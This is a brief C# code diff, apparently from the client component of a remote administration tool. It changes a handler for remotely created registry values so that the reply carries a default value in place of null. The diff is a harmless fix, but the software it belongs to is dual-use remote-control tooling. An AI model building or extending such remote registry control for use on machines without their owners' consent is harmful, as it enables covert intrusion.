@@ -140,8 +140,8 @@ namespace xClient.Core.Commands
                 errorMsg = ex.Message;
             }
             responsePacket.ErrorMsg = errorMsg;
-
-            responsePacket.Value = new RegValueData(newKeyName, packet.Kind.RegistryTypeToString(), null);
+            object valueData = packet.Kind.GetDefault();
+            responsePacket.Value = new RegValueData(newKeyName, packet.Kind.RegistryTypeToString(), packet.Kind.RegistryTypeToString(valueData));
             responsePacket.KeyPath = packet.KeyPath;
 
             responsePacket.Execute(client);
